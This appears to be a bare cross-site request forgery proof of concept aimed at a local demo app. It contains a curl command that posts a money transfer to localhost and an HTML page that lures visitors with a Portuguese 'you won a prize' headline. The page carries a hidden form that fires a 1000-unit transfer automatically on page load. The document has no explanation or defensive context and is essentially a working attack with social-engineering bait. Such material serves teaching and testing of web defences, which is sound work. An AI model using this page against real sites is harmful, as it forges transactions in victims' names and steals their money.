```bash
curl -X POST -d "amount=1000" http://localhost:8080/transfer
```

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>Você ganhou um prêmio 🎁</h1>
    <form action="http://localhost:8080/transfer" method="POST" id="csrf-form">
      <input type="hidden" id="amount" name="amount" value="1000">
    </form>
    <script>
      document.getElementById('csrf-form').submit()
    </script>
  </body>
</html>
```